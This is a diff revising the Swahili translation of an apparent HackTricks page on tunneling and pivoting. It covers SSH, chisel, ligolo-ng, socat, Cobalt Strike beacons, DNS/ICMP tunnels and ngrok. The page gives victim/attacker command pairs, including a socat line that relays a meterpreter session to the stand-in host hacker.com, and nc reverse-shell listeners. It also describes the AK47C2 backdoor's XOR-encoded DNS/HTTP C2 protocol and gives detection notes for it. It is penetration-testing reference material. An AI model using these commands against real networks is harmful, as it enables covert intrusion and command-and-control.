@@ -2,10 +2,10 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Kidokezo la Nmap
+## Ushauri wa Nmap
 
 > [!WARNING]
-> **ICMP** na **SYN** scans haiwezi kupitishwa kupitia socks proxies, hivyo lazima **disable ping discovery** (`-Pn`) na taja **TCP scans** (`-sT`) ili hili lifanye kazi.
+> **ICMP** na **SYN** scans haziwezi kupitishwa kupitia socks proxies, kwa hivyo lazima **tuzima ping discovery** (`-Pn`) na kubainisha **TCP scans** (`-sT`) ili hili lifanye kazi.
 
 ## **Bash**
 
@@ -27,13 +27,13 @@ evil-winrm -u username -i Jump
 ```
 ## **SSH**
 
-Muunganisho wa grafiki wa SSH (X)
+Muunganisho wa picha wa SSH (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Local Port2Port
 
-Fungua Port mpya kwenye SSH Server --> Port nyingine
+Fungua port mpya kwenye SSH Server --> Port nyingine
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-Port ya ndani --> Compromised host (SSH) --> Third_box:Port
+Port ya ndani --> Host iliyoathiriwa (SSH) --> Third_box:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -51,13 +51,13 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Bandari ya ndani --> host iliyotekwa (SSH) --> mahali popote
+Port ya ndani --> Host iliyoathirika (SSH) --> Popote pale
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
 ### Reverse Port Forwarding
 
-Hii ni muhimu kupata reverse shells kutoka kwa hosts za ndani kupitia DMZ hadi host yako:
+Hii ni muhimu kupata reverse shells kutoka kwa hosts za ndani kupitia DMZ hadi kwenye host yako:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-Unahitaji **root katika vifaa vyote viwili** (kwa sababu utaunda interfaces mpya) na usanidi wa sshd lazima uruhusu root login:\
+Unahitaji **root kwenye vifaa vyote viwili** (kwa kuwa utaunda interfaces mpya), na usanidi wa sshd lazima uruhusu kuingia kama root:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -83,18 +83,18 @@ Washa forwarding upande wa Server
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
-Weka njia mpya upande wa mteja
+Weka route mpya upande wa client
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
-> **Usalama – Terrapin Attack (CVE-2023-48795)**
-> Shambulio la downgrade la Terrapin la 2023 linaweza kumruhusu man-in-the-middle kuharibu early SSH handshake na kuingiza data katika **any forwarded channel** ( `-L`, `-R`, `-D` ). Hakikisha mteja na seva zimesasishwa (**OpenSSH ≥ 9.6/LibreSSH 6.7**) au zima wazi algorithimu zilizo hatarishi `chacha20-poly1305@openssh.com` na `*-etm@openssh.com` katika `sshd_config`/`ssh_config` kabla ya kutegemea SSH tunnels.
+> **Security – Terrapin Attack (CVE-2023-48795)**
+> Mashambulizi ya downgrade ya Terrapin ya mwaka 2023 yanaweza kumruhusu man-in-the-middle kuchezea SSH handshake ya awali na kuingiza data kwenye **channel yoyote iliyoforwardiwa** ( `-L`, `-R`, `-D` ). Hakikisha client na server zote zimefanyiwa patch (**OpenSSH ≥ 9.6/LibreSSH 6.7**) au uzime wazi algorithms zilizo hatarini `chacha20-poly1305@openssh.com` na `*-etm@openssh.com` kwenye `sshd_config`/`ssh_config` kabla ya kutegemea SSH tunnels.
 
 ## SSHUTTLE
 
-Unaweza **tunnel** via **ssh** all the **traffic** to a **subnetwork** through a host.\
-Kwa mfano, forwarding all the traffic going to 10.10.10.0/24
+Unaweza **kutunnel** kupitia **ssh** **traffic** yote ya **subnetwork** kupitia host.\
+Kwa mfano, kuforward traffic yote inayoelekea 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -108,7 +108,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-port ya ndani --> host iliyodukuliwa (session hai) --> Third_box:Port
+Local port --> host iliyoathiriwa (active session) --> Third_box:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Fungua port kwenye teamserver inayosikiliza kwenye interfaces zote ambayo inaweza kutumika **kupitisha trafiki kupitia beacon**.
+Fungua porti kwenye teamserver inayosikiliza kwenye interfaces zote, ambayo inaweza kutumika **kupeleka traffic kupitia beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -149,21 +149,21 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> Katika kesi hii, **port imefunguliwa kwenye beacon host**, sio kwenye Team Server na trafiki imetumwa kwa Team Server na kutoka huko kwenda host:port iliyotajwa.
+> Katika hali hii, **port inafunguliwa kwenye beacon host**, si kwenye Team Server, na traffic inatumwa kwa Team Server kisha kutoka hapo kwenda kwenye host:port iliyoonyeshwa.
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
 Kumbuka:
 
-- Beacon's reverse port forward imeundwa ili **tunnel traffic to the Team Server, not for relaying between individual machines**.
-- Trafiki inapitia **tunneled within Beacon's C2 traffic**, ikiwa ni pamoja na P2P links.
-- **Admin privileges are not required** kuunda reverse port forwards kwenye high ports.
+- Beacon's reverse port forward imeundwa **kutunnel traffic kwenda kwenye Team Server, si kwa ajili ya kurelay traffic kati ya mashine binafsi**.
+- Traffic **inatunnel ndani ya Beacon's C2 traffic**, ikijumuisha P2P links.
+- **Admin privileges hazihitajiki** kuunda reverse port forwards kwenye high ports.
 
 ### rPort2Port local
 
 > [!WARNING]
-> Katika kesi hii, the **port is opened in the beacon host**, sio kwenye Team Server na **traffic is sent to the Cobalt Strike client** (not to the Team Server) na kutoka huko kwenda host:port iliyotajwa
+> Katika hali hii, **port inafunguliwa kwenye beacon host**, si kwenye Team Server, na **traffic inatumwa kwenye Cobalt Strike client** (si kwenye Team Server), kisha kutoka hapo inatumwa kwenye host:port iliyoonyeshwa.
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -172,14 +172,14 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Unahitaji kupakia faili ya tunnel ya wavuti: ashx|aspx|js|jsp|php|php|jsp
+Unahitaji kupakia web file tunnel: ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
 ## Chisel
 
-Unaweza kuipakua kutoka kwenye ukurasa wa releases wa [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-Unahitaji kutumia **toleo lilezile kwa client na server**
+Unaweza kuipakua kutoka ukurasa wa releases wa [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
+Unahitaji kutumia **toleo lilelile kwa client na server**
 
 ### socks
 ```bash
@@ -190,7 +190,7 @@ Unahitaji kutumia **toleo lilezile kwa client na server**
 ./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
 ./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
-### Upelekaji bandari
+### Port forwarding
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
@@ -199,7 +199,7 @@ Unahitaji kutumia **toleo lilezile kwa client na server**
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-**Tumia toleo sawa kwa agent na proxy**
+**Tumia toleo lilelile kwa agent na proxy**
 
 ### Tunneling
 ```bash
@@ -223,7 +223,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Kufunga na Kusikiliza kwa Agent
+### Binding na Listening ya Agent
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -231,7 +231,7 @@ listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 # Display the currently running listeners on the agent -- Attacker
 listener_list
 ```
-### Kupata Agent's Local Ports
+### Kufikia Port za Ndani za Agent
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
@@ -242,7 +242,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
 Reverse tunnel. Tunnel inaanzishwa kutoka kwa victim.\
-socks4 proxy inaundwa kwenye 127.0.0.1:1080
+Proxy ya socks4 inaundwa kwenye 127.0.0.1:1080
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
 ```
@@ -290,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Unaweza kupitisha **non-authenticated proxy** kwa kutekeleza mstari huu badala ya ule wa mwisho kwenye console ya mwathirika:
+Unaweza kupita **proxy isiyohitaji uthibitishaji** kwa kutekeleza mstari huu badala ya wa mwisho kwenye console ya mwathiriwa:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -300,7 +300,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 **/bin/sh console**
 
-Tengeneza vyeti pande zote mbili: Client na Server
+Unda certificates kwenye pande zote mbili: Client na Server
 ```bash
 # Execute these commands on both sides
 FILENAME=socatssl
@@ -316,7 +316,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Unganisha port ya SSH ya lokali (22) kwa port 443 ya attacker host
+Unganisha port ya SSH ya ndani (22) na port 443 ya attacker host
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -324,9 +324,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Ni kama toleo la console la PuTTY ( the options are very similar to an ssh client).
+Ni kama toleo la console la PuTTY (chaguo zake zinafanana sana na za ssh client).
 
-As this binary will be executed in the victim and it is an ssh client, we need to open our ssh service and port so we can have a reverse connection. Then, to forward only locally accessible port to a port in our machine:
+Kwa kuwa binary hii itatekelezwa kwenye mwathiriwa na ni ssh client, tunahitaji kufungua huduma na port yetu ya ssh ili tuweze kupata reverse connection. Kisha, ku-forward port inayoweza kufikiwa locally pekee kwenda kwenye port kwenye machine yetu:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -347,20 +347,20 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-Unahitaji kuwa na **RDP access kwenye mfumo**.\
+Unahitaji kuwa na **RDP access kwenye system**.\
 Pakua:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Chombo hiki kinatumia `Dynamic Virtual Channels` (`DVC`) kutoka kwenye kipengele cha Remote Desktop Service cha Windows. DVC inawajibika kwa **kupitisha packets kupitia muunganisho wa RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Tool hii hutumia `Dynamic Virtual Channels` (`DVC`) kutoka kwenye kipengele cha Remote Desktop Service cha Windows. DVC inawajibika kwa **kutunnel packets kupitia connection ya RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-Kwenye kompyuta ya mteja wako, pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavyo:
+Kwenye kompyuta yako ya client, pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavyo:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Sasa tunaweza **kuunganisha** kwenye **victim** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **prompt** inayosema kwamba **SocksOverRDP plugin is enabled**, na itasikiliza kwenye **127.0.0.1:1080**.
+Sasa tunaweza **kuunganisha** kwenye **victim** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **ujumbe** unaosema kwamba **SocksOverRDP plugin** imewezeshwa, na itaanza **kusikiliza** kwenye **127.0.0.1:1080**.
 
-**Unganisha** kupitia **RDP** na pakia & endesha kwenye mashine ya **victim** binary `SocksOverRDP-Server.exe`:
+**Unganisha** kupitia **RDP**, kisha upakie na utekeleze kwenye mashine ya victim binary ya `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -368,18 +368,18 @@ Sasa, thibitisha kwenye mashine yako (attacker) kwamba port 1080 inasikiliza:
 ```
 netstat -antb | findstr 1080
 ```
-Now you can use [**Proxifier**](https://www.proxifier.com/) **kupitisha trafiki kupitia port hiyo.**
+Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) **kupitisha traffic kupitia port hiyo.**
 
-## Proxify Programu za GUI za Windows
+## Proxify Windows GUI Apps
 
-Unaweza kufanya programu za GUI za Windows zipite kupitia proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
-Katika **Profile -> Proxy Servers** ongeza IP na port ya server ya SOCKS.\
-Katika **Profile -> Proxification Rules** ongeza jina la programu unayotaka proxify na muunganisho kwa IPs unazotaka proxify.
+Unaweza kufanya Windows GUI apps zipitie proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
+Katika **Profile -> Proxy Servers**, ongeza IP na port ya SOCKS server.\
+Katika **Profile -> Proxification Rules**, ongeza jina la program itakayotumia proxy na connections kwenye IP unazotaka zipitie proxy.
 
-## Kuepuka proxy ya NTLM
+## NTLM proxy bypass
 
-Chombo kilichotajwa hapo awali: **Rpivot**\
-**OpenVPN** pia inaweza kuikwepa, kwa kuweka chaguzi hizi kwenye faili ya usanidi:
+Tool iliyotajwa awali: **Rpivot**\
+**OpenVPN** pia inaweza kuibypass, kwa kuweka options hizi kwenye configuration file:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -387,7 +387,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Inathibitisha dhidi ya proxy na ina-bind port kwa ndani ambayo ime-forwarded kwa external service unayobainisha. Kisha, unaweza kutumia tool unayochagua kupitia port hii.\ Kwa mfano, inaforward port 443
+Inafanya authentication dhidi ya proxy na kufunga port locally ambayo inapeleka traffic kwenye external service unayoainisha. Kisha, unaweza kutumia tool unayoichagua kupitia port hii.\
+Kwa mfano, ku-forward port 443
 ```
 Username Alice
 Password P@ssw0rd
@@ -395,12 +396,12 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Sasa, ikiwa utaweka kwa mfano kwenye victim huduma ya **SSH** kusikiliza kwenye port 443, unaweza kuungana nayo kupitia port 2222 ya attacker.\
-Pia unaweza kutumia **meterpreter** inayounganisha kwa localhost:443 na attacker anasikiliza kwenye port 2222.
+Sasa, ikiwa kwa mfano utaweka huduma ya **SSH** kwenye victim isikilize porti 443, unaweza kuunganisha nayo kupitia porti 2222 ya attacker.\
+Unaweza pia kutumia **meterpreter** inayounganisha kwenye localhost:443, huku attacker akisubiri kwenye porti 2222.
 
 ## YARP
 
-A reverse proxy iliyotengenezwa na Microsoft. Unaweza kuipata hapa: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+Reverse proxy iliyoundwa na Microsoft. Unaweza kuipata hapa: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## DNS Tunneling
 
@@ -408,21 +409,21 @@ A reverse proxy iliyotengenezwa na Microsoft. Unaweza kuipata hapa: [https://git
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root inahitajika katika pande zote mbili ili kuunda tun adapters na kupitisha data kati yao kwa kutumia DNS queries.
+Root inahitajika kwenye mifumo yote miwili ili kuunda tun adapters na kutunnel data kati yao kwa kutumia DNS queries.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-Tunneli itakuwa polepole sana. Unaweza kuunda muunganisho wa SSH ulioshinikizwa kupitia tunneli hii kwa kutumia:
+Tunnel itakuwa ya polepole sana. Unaweza kuunda muunganisho wa SSH uliobanwa kupitia tunnel hii kwa kutumia:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
 ### DNSCat2
 
-[**Download it from here**](https://github.com/iagox86/dnscat2)**.**
+[**Pakua kutoka hapa**](https://github.com/iagox86/dnscat2)**.**
 
-Inaunda chaneli ya C\&C kupitia DNS. Haitaji root privileges.
+Huanzisha channel ya C&C kupitia DNS. Haihitaji privileges za root.
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -431,58 +432,58 @@ victim> ./dnscat2 tunneldomain.com
 attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
 victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
-#### **Katika PowerShell**
+#### **In PowerShell**
 
-Unaweza kutumia [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kuendesha mteja wa dnscat2 katika PowerShell:
+Unaweza kutumia [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kuendesha client ya dnscat2 kwenye PowerShell:
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
-#### **Port forwarding na dnscat**
+#### **Port forwarding kwa dnscat**
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
-#### Badilisha proxychains DNS
+#### Badilisha DNS ya proxychains
 
-Proxychains inakamatisha wito wa `gethostbyname` libc na kutunulia maombi ya DNS ya tcp kupitia socks proxy. Kwa **chaguo-msingi** server ya **DNS** ambayo proxychains inatumia ni **4.2.2.2** (hardcoded). Kuibadilisha, hariri faili: _/usr/lib/proxychains3/proxyresolv_ na badilisha IP. Ikiwa uko katika **Windows environment** unaweza kuweka IP ya **domain controller**.
+Proxychains inakatiza `gethostbyname` libc call na ku-tunnel ombi la tcp DNS kupitia socks proxy. Kwa **default**, server ya **DNS** inayotumiwa na proxychains ni **4.2.2.2** (hardcoded). Ili kuibadilisha, edit file: _/usr/lib/proxychains3/proxyresolv_ na ubadilishe IP. Ikiwa uko katika **Windows environment**, unaweza kuweka IP ya **domain controller**.
 
-## Tunnels in Go
+## Tunnels katika Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
 ### Custom DNS TXT / HTTP JSON C2 (AK47C2)
 
-Mhusika wa Storm-2603 alitengeneza a **dual-channel C2 ("AK47C2")** inayotumia *tu* trafiki ya nje ya **DNS** na **plain HTTP POST** – itifaki mbili ambazo mara chache huzuia kwenye mitandao ya kampuni.
+Storm-2603 actor aliunda **dual-channel C2 ("AK47C2")** inayotumia vibaya *only* traffic ya **DNS** ya kutoka nje na **plain HTTP POST** – protocols mbili ambazo mara chache huzuiwa kwenye corporate networks.<sup>[[2]](#references)</sup>
 
 1. **DNS mode (AK47DNS)**
-• Inazalisha SessionID isiyotarajiwa ya herufi 5 (mfano `H4T14`).
-• Inaweka mbele `1` kwa *task requests* au `2` kwa *results* na kuunganisha mashamba tofauti (flags, SessionID, jina la kompyuta).
-• Kila uwanja umefichwa kwa **XOR** kwa key ya ASCII `VHBD@H`, imekodishwa kwa hex, na kuunganishwa kwa nukta – hatimaye kukamilisha na domain inayodhibitiwa na mshambulizi:
+• Hutengeneza SessionID ya random yenye characters 5 (mfano `H4T14`).
+• Huongeza `1` kwa *task requests* au `2` kwa *results*, kisha huunganisha fields tofauti (flags, SessionID, computer name).
+• Kila field huwa **XOR-encrypted kwa ASCII key `VHBD@H`**, hu-encode kwa hex, na huunganishwa kwa dots – mwishowe huishia kwenye attacker-controlled domain:
 
 ```text
 <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
 ```
 
-• Maombi yanatumia `DnsQuery()` kwa rekodi za **TXT** (na fallback **MG**).
-• Wakati majibu yanazidi 0xFF bytes backdoor huwaigawanya data katika vipande vya 63-byte na kuingiza alama:
-`s<SessionID>t<TOTAL>p<POS>` ili server ya C2 iweze kuzipanga upya.
+• Requests hutumia `DnsQuery()` kwa records za **TXT** (na fallback **MG**).
+• Response inapozidi bytes 0xFF, backdoor hugawanya data katika vipande vya bytes 63 na huingiza markers:
+`s<SessionID>t<TOTAL>p<POS>` ili C2 server iweze kuvipanga upya.
 
 2. **HTTP mode (AK47HTTP)**
-• Inajenga JSON envelope:
+• Huunda JSON envelope:
 ```json
 {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
 ```
-• Blob nzima inafichwa kwa XOR-`VHBD@H` → hex → imetumwa kama mwili wa **`POST /`** na header `Content-Type: text/plain`.
-• Jibu linafuata uandishi uleule na uwanja `cmd` unatekelezwa kwa `cmd.exe /c <command> 2>&1`.
+• Blob yote huwa XOR-`VHBD@H` → hex → hutumwa kama body ya **`POST /`** yenye header `Content-Type: text/plain`.
+• Reply hufuata encoding hiyo hiyo na field ya `cmd` hutekelezwa kwa `cmd.exe /c <command> 2>&1`.
 
-Blue Team notes
-• Tafuta maswali ya **TXT** yasiyo ya kawaida yenye lebo ya kwanza ni hexadecimal ndefu na kila mara yanamalizia kwa domain adimu.
-• Key ya XOR isiyobadilika ikifuatiwa na ASCII-hex ni rahisi kugundua kwa YARA: `6?56484244?484` (`VHBD@H` in hex).
-• Kwa HTTP, angalia body za POST za text/plain ambazo ni hex safi na maradufu ya mbili bytes.
+Notes za Blue Team
+• Tafuta **TXT queries** zisizo za kawaida ambazo label yao ya kwanza ni hexadecimal ndefu na huishia kila mara kwenye domain moja adimu.
+• XOR key ya kudumu inayofuatwa na ASCII-hex ni rahisi kugundua kwa YARA: `6?56484244?484` (`VHBD@H` katika hex).
+• Kwa HTTP, flag text/plain POST bodies ambazo ni hex tupu na zina multiple ya bytes mbili.
 
 {{#note}}
-Channel nzima inafaa ndani ya **standard RFC-compliant queries** na huweka kila lebo ya sub-domain kuwa chini ya 63 bytes, ikifanya kuwa inayojiweka nyuma (stealthy) katika wengi wa DNS logs.
+Channel yote inatoshea ndani ya **standard RFC-compliant queries** na huweka kila sub-domain label chini ya bytes 63, hivyo huwa stealthy katika DNS logs nyingi.
 {{#endnote}}
 
 ## ICMP Tunneling
@@ -492,7 +493,7 @@ Channel nzima inafaa ndani ya **standard RFC-compliant queries** na huweka kila 
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root inahitajika katika pande zote mbili kuunda tun adapters na kutunelisha data kati yao kwa kutumia ICMP echo requests.
+Root inahitajika katika systems zote mbili ili kuunda tun adapters na ku-tunnel data kati yao kwa kutumia ICMP echo requests.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -516,13 +517,13 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-[**ngrok**](https://ngrok.com/) **ni zana ya kuweka huduma kwenye Intaneti kwa amri moja ya terminal.**\
-_URI za kufikia ni kama:_ **UID.ngrok.io**
+[**ngrok**](https://ngrok.com/) **ni tool ya kuweka solutions wazi kwenye Internet kwa command line moja.**\
+_URI za ufichuaji ni kama:_ **UID.ngrok.io**
 
 ### Usakinishaji
 
-- Unda akaunti: https://ngrok.com/signup
-- Pakua client:
+- Fungua account: https://ngrok.com/signup
+- Upakuaji wa Client:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
 chmod a+x ./ngrok
@@ -531,11 +532,11 @@ chmod a+x ./ngrok
 ```
 ### Matumizi ya msingi
 
-**Nyaraka:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
+**Hati:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-_Pia inawezekana kuongeza authentication na TLS, ikiwa inahitajika._
+_Inawezekana pia kuongeza authentication na TLS, ikiwa ni lazima._
 
-#### Tunneling TCP
+#### Tunneling ya TCP
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
@@ -543,15 +544,15 @@ _Pia inawezekana kuongeza authentication na TLS, ikiwa inahitajika._
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-#### Kufichua faili kupitia HTTP
+#### Kufichua faili kwa HTTP
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
-#### Sniffing HTTP calls
+#### Sniffing miito ya HTTP
 
-_Inafaa kwa XSS,SSRF,SSTI ..._\
-Moja kwa moja kutoka stdout au kwenye kiolesura ya HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
+_Useful for XSS,SSRF,SSTI ..._\
+Moja kwa moja kutoka stdout au katika interface ya HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
 #### Tunneling huduma ya HTTP ya ndani
 ```bash
@@ -560,12 +561,12 @@ Moja kwa moja kutoka stdout au kwenye kiolesura ya HTTP [http://127.0.0.1:4040](
 # With basic auth
 ./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
 ```
-#### ngrok.yaml mfano rahisi wa usanidi
+#### Mfano rahisi wa usanidi wa ngrok.yaml
 
-Inafungua 3 tunnels:
+Inafungua tunnels 3:
 
-- 2 TCP
-- 1 HTTP na kuonyesha faili za statiki kutoka /tmp/httpbin/
+- TCP 2
+- HTTP 1 yenye uwasilishaji wa static files kutoka /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
@@ -580,9 +581,9 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tunnel)
 
-Daemon ya Cloudflare `cloudflared` inaweza kuunda tuneli za outbound ambazo zinaonyesha **local TCP/UDP services** bila kuhitaji inbound firewall rules, kwa kutumia edge ya Cloudflare kama kitovu cha kukutana. Hii ni muhimu sana wakati egress firewall inaruhusu tu trafiki ya HTTPS lakini muunganisho wa inbound umekataliwa.
+Daemon ya Cloudflare `cloudflared` inaweza kuunda tunnels za outbound zinazowezesha **local TCP/UDP services** kufikiwa bila kuhitaji inbound firewall rules, kwa kutumia edge ya Cloudflare kama rendez-vous point. Hii ni muhimu sana wakati egress firewall inaruhusu HTTPS traffic pekee lakini inbound connections zimezuiwa.
 
-### One-liner ya tuneli ya haraka
+### Quick tunnel one-liner
 ```bash
 # Expose a local web service listening on 8080
 cloudflared tunnel --url http://localhost:8080
@@ -594,7 +595,7 @@ cloudflared tunnel --url http://localhost:8080
 cloudflared tunnel --url socks5://localhost:1080 --socks5
 # Now configure proxychains to use 127.0.0.1:1080
 ```
-### Persistent tunnels na DNS
+### Tunnels zinazoendelea kwa DNS
 ```bash
